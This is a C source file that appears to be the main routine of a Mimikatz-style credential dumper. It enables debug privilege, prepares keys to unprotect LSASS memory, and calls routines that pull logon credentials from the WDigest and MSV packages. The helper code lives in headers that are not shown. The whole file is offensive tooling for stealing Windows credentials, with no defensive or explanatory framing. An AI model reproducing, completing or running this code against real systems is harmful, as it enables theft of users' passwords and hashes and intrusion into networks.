#include <stdio.h>
#include "privilege.h"
#include "sekurlsa.h"

DWORD wmain(DWORD argc, PWCHAR argv[]) {
	
	printf("***********************************************\n");
	printf("*           privilege::debug                  *\n");
	printf("***********************************************\n");
	AdjustProcessPrivilege();



	printf("***********************************************\n");
	printf("*           preparing sekurlsa module         *\n");
	printf("***********************************************\n");
	PrepareUnprotectLsassMemoryKeys();
	


	printf("***********************************************\n");
	printf("*           sekurlsa::wdigest                 *\n");
	printf("***********************************************\n");
	GetCredentialsFromWdigest();



	printf("***********************************************\n");
	printf("*           sekurlsa::msv                     *\n");
	printf("***********************************************\n");
	GetCredentialsFromMSV();



	system("pause");
	return 0;
}